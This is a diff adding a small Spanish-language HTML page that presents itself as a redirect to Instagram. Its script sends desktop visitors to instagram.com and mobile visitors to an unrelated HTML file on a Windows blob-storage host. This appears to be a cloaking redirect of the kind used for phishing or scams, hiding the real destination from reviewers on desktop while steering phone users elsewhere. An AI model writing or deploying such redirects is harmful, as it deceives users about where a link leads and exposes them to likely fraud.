@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>¡Redireccionando!</title>
+</head>
+<body>
+
+<script>
+  function redirectToInstagram() {
+    var isMobile = /Mobi|Android/i.test(navigator.userAgent);
+    var url = isMobile ? 'https://progenture.blob.core.windows.net/newgen/词汇1.html' : 'https://www.instagram.com/';
+    window.location.href = url;
+  }
+
+  redirectToInstagram();
+</script>
+
+</body>
+</html>
